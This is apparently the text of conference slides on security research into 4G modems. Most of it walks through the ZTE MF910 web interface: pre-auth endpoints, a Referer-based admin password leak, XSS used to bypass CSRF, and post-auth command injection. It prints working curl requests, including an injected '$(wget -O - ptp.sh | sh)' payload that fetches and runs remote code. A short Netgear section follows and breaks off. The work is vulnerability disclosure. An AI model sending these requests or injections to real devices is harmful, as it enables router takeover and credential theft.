syslogd, dnsmasq, & zte_topsw_wispr exposed remotely
zte_topsw_goahead CSRF/LAN-side only
ZTE MF910 - zte_topsw_goahead
zte_topsw_goahead
ZTE MF910 - Web Interface Black Box
All requests which “do something” are made 
to /goform/* API endpoints.
-
/goform/goform_get_cmd_process
-
For reading data.
-
/goform/goform_set_cmd_process
-
For writing data. 
ZTE MF910 - Web Interface Topology
goform_get_cmd_process
cmd
multi_data
goform_set_cmd_process
goformId
custom params
isTest seems useless.
ZTE MF910 - zte_topsw_goahead - Secret Endpoints
There’s a lot more endpoints in the 
binary than we see from normal use.
Not all of them do much, or are that 
interesting. It’s a lot of leftover code, 
which increases the attack surface.
ZTE MF910 - goform_set_cmd_process - Pre-Auth Surface
Some goformId functions are 
explicitly “whitelisted”: these can be 
interacted with before 
authentication.
Found a nice new way to enable 
adb pre-authentication though...
ZTE MF910 - zte_topsw_goahead
ZTE MF910 - goform_set_cmd_process - SET_DEVICE_MODE
SET_DEVICE_MODE takes a parameter with the name debug_enable.
Just pure echo’s that parameter to /sys/bl/ah/debug_enable -> system()
ZTE MF910 - goform_set_cmd_process - SET_DEVICE_MODE
$ curl -i "http://192.168.0.1/goform/goform_set_cmd_process?
goformId=SET_DEVICE_MODE&debug_enable=1"
HTTP/1.0 200 OK
Server: GoAhead-Webs
Pragma: no-cache
Cache-control: no-cache
Content-Type: text/html
{"result":"success"}
Not injectable, because the debug_enable value is checked 😒
Whatever, saves me having to log in every time I reboot the thing. 
ZTE MF910 - zte_topsw_goahead
ZTE MF910 - zte_topsw_goahead - The State of the Code
Lots of zte_syslog_append calls. Writes verbose debug info to syslog.
Makes knowing where we are in the code really easy.
ZTE MF910 - zte_topsw_goahead
ZTE MF910 - goform_set_cmd_process - Remote Syslog
/zte_syscmd_process
One of the 
“undocumented” 
endpoints
Remote syslog = syslog 
being sent across the 
network to UDP/514 of the 
requesting IP.
ZTE MF910 - goform_set_cmd_process - Remote Syslog
Only available post-auth. 
But can be useful in ﬁguring out where in any ZTE code you’re hitting. 
Open up UDP/514 and brace yourself for a barrage of trash. 
$ curl -i "http://192.168.0.1/goform/zte_syscmd_process
?syscmd=zte_syslog&syscall=set_remotelog&action=enable"
HTTP/1.0 200 OK
Server: GoAhead-Webs
Pragma: no-cache
Cache-control: no-cache
Content-Type: text/html
{"result":"success"}
ZTE MF910 - goform_set_cmd_process - Remote Syslog
$ sudo nc -nvlup 514
listening on [any] 514 ...
connect to [192.168.0.105] from (UNKNOWN) [192.168.0.1] 34054
Jan  6 11:04:26 zte_wan_nwinfor: zte_nwinfo.log zte_wan_nwinfor.c 5881 QMI_NAS_EVENT_REPORT_IND_MSG_V01 process...
Jan  6 11:04:27 zte_topsw_sleep: zte_libsocket.log libzte_socket.c 106 can not accept client, errno: 4, pid=540
Jan  6 11:04:30 zte_topsw_sleep: zte_libsocket.log libzte_socket.c 106 can not accept client, errno: 4, pid=540
Jan  6 11:04:33 zte_topsw_sleep: zte_libsocket.log libzte_socket.c 106 can not accept client, errno: 4, pid=540
Jan  6 11:04:35 zte_topsw_goahead: goahead.log webs.c 3334 websSetLoginTimemark:ufi to check.
Jan  6 11:04:36 zte_topsw_sleep: zte_libsocket.log libzte_socket.c 106 can not accept client, errno: 4, pid=540
Jan  6 11:04:37 zte_topsw_goahead: goahead.log webs.c 3334 websSetLoginTimemark:ufi to check.
Jan  6 11:04:37 zte_topsw_goahead: goahead.log ../zte_web/zte_web_sms.c 1156 total_pages,leave_nums:[50][0]
Jan  6 11:04:37 zte_topsw_goahead: goahead.log ../zte_web/zte_web_sms.c 1185 sms_query_req:[0,10,1,10,order by id desc].
Jan  6 11:04:37 zte_topsw_goahead: goahead.log ../zte_web/zte_web_sms.c 1209 total query count [0].
Jan  6 11:04:37 zte_topsw_goahead: goahead.log ../zte_web/zte_web_pbm.c 680 pbm:total_pages,leave_nums:[20][0]
Jan  6 11:04:37 zte_topsw_goahead: goahead.log ../zte_web/zte_web_pbm.c 701 pbm_query_req:[0,100,2].
Jan  6 11:04:37 zte_topsw_goahead: zte_pbm.log libzte_pbm.c 566 zte_libpbm_get_rec_data enter
Jan  6 11:04:37 zte_topsw_goahead: zte_pbm.log libzte_pbm.c 577 zte_pbm no sim card
Jan  6 11:04:37 zte_topsw_cfg: zte_cfg.log zte_topsw_cfg.c 1097 received data from client is:209
Jan  6 11:04:37 zte_topsw_cfg: zte_cfg.log zte_topsw_cfg.c 1114 zte_client_send_msg->send ok
Jan  6 11:04:37 zte_topsw_goahead: zte_cfg.log libzte_cfg.c 260 send item_id successful
Jan  6 11:04:37 zte_topsw_goahead: zte_pbm.log libzte_pbm.c 495 zte_libpbm_get_device_rec_data enter
Jan  6 11:04:37 zte_topsw_goahead: zte_pbm.log libzte_pbm.c 215 zte_pbm_db_exec_sql enter
Jan  6 11:04:37 zte_topsw_goahead: zte_pbm.log libzte_pbm.c 173 zte_libpbm_db_open enter
Jan  6 11:04:37 zte_topsw_goahead: zte_pbm.log libzte_pbm.c 195 zte_libpbm_db_close enter
Jan  6 11:04:37 zte_topsw_goahead: goahead.log ../zte_web/zte_web_pbm.c 725 pbm:total query count [0].
Jan  6 11:04:39 zte_topsw_sleep: zte_libsocket.log libzte_socket.c 106 can not accept client, errno: 4, pid=540
Jan  6 11:04:39 zte_topsw_goahead: goahead.log webs.c 3334 websSetLoginTimemark:ufi to check.
Jan  6 11:04:40 zte_topsw_goahead: goahead.log ../zte_web/zte_web_pbm.c 817 pbm_location is [pbm_sim].
...
ZTE MF910 - goform_set_cmd_process - Remote Syslog
(also available: syslog being dumped to a ﬁle for downloading later, and 
access to kernel logs).
ZTE MF910 - zte_topsw_goahead
ZTE MF910 - goform_set_cmd_process - goformId
Can’t actually access these on the 
MF910 because no SD support.
Really basic RE shows a really likely 
command injection point in there…
Can’t really “conﬁrm” this “issue” on 
the MF910, but might aﬀect others...
ZTE MF910 - goform_set_cmd_process - HTTPSHARE_NEW
$ curl -i ‘http://192.168.0.1/goform/goform_set_cmd_process
?goformId=HTTPSHARE_NEW&
path_SD_CARD=/home/root/mmc2/blah$(wget -O - ptp.sh | sh)’
HTTP/1.0 200 OK
Server: GoAhead-Webs
Pragma: no-cache
Cache-control: no-cache
Content-Type: text/html
{"result":"?!?!? WE WILL NEVER KNOW ?!?!?"}
But…. if I did have a modem which supported SD cards, my exploit would look 
like this:
ZTE MF910 - zte_topsw_goahead
ZTE MF910 - zte_topsw_goahead
ZTE MF910 - goform_get_cmd_process
For the goform_get_cmd_process 
function, there isn’t a proper auth 
check.
But, there is a CSRF protection check, 
made against the value of the 
Referer request header...
ZTE MF910 - admin password leak
$ curl -i --referer http://naughty.website/ “http://192.168.0.1/goform/
goform_get_cmd_process?cmd=admin_Password&multi_data=0”
HTTP/1.0 200 OK
Server: GoAhead-Webs
Pragma: no-cache
Cache-control: no-cache
Content-Type: text/html
{"admin_Password":""}
So this doesn’t work.
$ curl -i --referer http://naughty.website/ “http://192.168.0.1/goform/
goform_get_cmd_process?cmd=admin_Password&multi_data=0”
HTTP/1.0 200 OK
Server: GoAhead-Webs
Pragma: no-cache
Cache-control: no-cache
Content-Type: text/html
{"admin_Password":""}
ZTE MF910 - admin password leak
$ curl -i --referer http://192.168.0.1/ “http://192.168.0.1/goform/
goform_get_cmd_process?cmd=admin_Password&multi_data=0”
HTTP/1.0 200 OK
Server: GoAhead-Webs
Pragma: no-cache
Cache-control: no-cache
Content-Type: text/html
{"admin_Password":"SecretPassword123"}
But this does.
ZTE MF910 - zte_topsw_goahead
ZTE MF910 - Command Injection
The (post-authentication) function for USB_MODE_SWITCH. 
Takes usb_mode value and passes it straight to system()
ZTE MF910 - Mitigations
ZTE MF910 - Mitigations
CSRF protection based on Referer header, rather than a token. 
Requests to goform_set_cmd_process will also fail if the Referer header 
doesn’t match the device IP or 127.0.0.1. 
We can’t guarantee we can control the Referer header in-browser, we can’t 
attack directly from another page context. 
ZTE MF910 - CSRF Protection
$ curl -i --referer http://naughty.website/ 
"http://192.168.0.1/goform/goform_set_cmd_process?isTest=fal
se&goformId=LOGIN&password=YWRtaW4%3D"
HTTP/1.0 200 OK
Server: GoAhead-Webs
Pragma: no-cache
Cache-control: no-cache
Content-Type: text/html
{"result":"failure"}
ZTE MF910 - CSRF Protection
$ curl -i --referer http://192.168.0.1/ 
"http://192.168.0.1/goform/goform_set_cmd_process?isTest=fal
se&goformId=LOGIN&password=YWRtaW4%3D"
HTTP/1.0 200 OK
Server: GoAhead-Webs
Pragma: no-cache
Cache-control: no-cache
Content-Type: text/html
{"result":"0"}
ZTE MF910 - zte_topsw_goahead
ZTE MF910 - Breaking Mitigations
XSS allows us to bypass these restrictions, and any JS we run on a router page 
would send requests with a Referer header set to the router IP.
There’s very trivial, clean XSS at /goform/formTest
ZTE MF910 - Breaking Mitigations
/goform/formTest?name=&address=
Anyway, that’s that 
CSRF protection 
bypassed.
ZTE MF910 - Writing an exploit
Simple enough to write an exploit chain with all this.
XSS allows us to run JavaScript in the router web page context...
→ ...which means Referer header will be the router IP…
→ …plus we then don’t have to worry about the SOP...
→ ...so we can leak AND read the admin password...
→ ...which we can use to log in...
→ ...& exploit the post-auth command injection.
ZTE MF910 - Writing an exploit
The CSRF -> XSS looks like this
ZTE MF910 - Writing an exploit
And mf910.js looks like 
this.
ZTE MF910 - Exploit Time
 DEMO TIME 😰
ZTE MF910 - More reading
More stuﬀ, written down:
https://ptp.sh/zte_mf910
Case Study Two: “High End” - Netgear Nighthawk M1
Netgear Nighthawk M1 - Why this modem?
It’s high-end!
Really expensive (like €200/$300)?!
Not much public information about 
[getting into] its internals.
Using a very new Qualcomm SoC 
(MDM9250)
It’s “a challenge”
Netgear Nighthawk M1 - Why this modem?
Netgear Nighthawk M1 - Bug Bounty
Also, it’s part of the Netgear bug 
bounty!
The bounty scope is only on 
higher-end  (expensive $$$) products.
Payout based on CVSSv3 score 
(calculated by Netgear).
Ker-ching!
Netgear Nighthawk M1 - Ker-Ching?
I hate this.
Grim NDA legal terms.
No thanks.
Netgear Nighthawk M1 - I Hate the Netgear bug bounty
Critical?
High?
Medium
Low?
Netgear Nighthawk M1 - I Hate the Netgear bug bounty
Go through Bugcrowd =
Sworn to secrecy?
Get forced to “perform”???
Maybe get $300 tops?
Netgear Nighthawk M1 - I Hate the Netgear bug bounty
Go through Bugcrowd =
Sworn to secrecy? ❌
Get forced to “perform”??? ❌
Maybe get $300 tops? ❌
Speak at DEF CON: 
Badmouth Netgear in public. ✅
Get $300 anyway (ker-ching). ✅
Netgear Nighthawk M1 - Hardware Highlights
Netgear Nighthawk M1 - Hardware Highlights